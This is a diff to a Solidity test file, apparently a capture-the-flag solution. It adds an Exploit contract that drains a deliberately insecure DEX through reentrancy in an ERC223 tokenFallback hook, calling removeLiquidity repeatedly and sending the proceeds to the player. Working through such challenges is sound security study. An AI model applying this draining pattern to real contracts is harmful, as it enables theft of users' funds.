@@ -47,7 +47,14 @@ contract Challenge2Test is Test {
         /*//////////////////////////////
         //    Add your hack below!    //
         //////////////////////////////*/      
-
+        Exploit attacker = new Exploit(address(token0), address(token1), address(target), address(player));
+        token0.approve(address(attacker), token0.balanceOf(address(player)));
+        token1.approve(address(attacker), token0.balanceOf(address(player)));
+        token0.transfer(address(attacker), token0.balanceOf(address(player)));
+        token1.transfer(address(attacker), token1.balanceOf(address(player)));
+        console.log("balance token0 attacker",token0.balanceOf(address(attacker)));
+        console.log("balance token1 attacker",token1.balanceOf(address(attacker)));
+        attacker.pwn();
         //============================//
 
         vm.stopPrank();
@@ -71,4 +78,42 @@ contract Exploit {
     IERC20 public token0; // this is insecureumToken
     IERC20 public token1; // this is simpleERC223Token
     InsecureDexLP public dex;
+
+    address player;
+    uint256 amountLP;
+    bool allowReentrancy;
+    constructor(address _token0, address _token1, address _dex, address _player){
+        token0 = IERC20(_token0);
+        token1 = IERC20(_token1);
+        dex = InsecureDexLP(_dex);
+        player = _player;
+        token0.approve(address(dex),type(uint256).max);
+        token1.approve(address(dex),type(uint256).max);
+        token0.approve(player,type(uint256).max);
+        token1.approve(player,type(uint256).max);
+    }
+
+    function pwn() external{
+        allowReentrancy=true;
+        dex.addLiquidity(token0.balanceOf(address(this)), token1.balanceOf(address(this)));
+        amountLP = dex.balanceOf(address(this));
+        dex.removeLiquidity(amountLP);
+
+    }
+
+    function tokenFallback(address _dex,uint256 amount,bytes memory data) external{
+        //reentrancy due to ERC223
+
+        //first transfer player -> attacker
+        if (!allowReentrancy){
+            return;
+        }
+        //transfer dex -> attacker
+        if((token0.balanceOf(address(dex)) == 0) && (token1.balanceOf(address(dex)) == 0) ){
+            token0.transfer(player,token0.balanceOf(address(this)));
+            token1.transfer(player,token1.balanceOf(address(this)));
+            return;
+        }
+        dex.removeLiquidity(amountLP);
+    }
 }
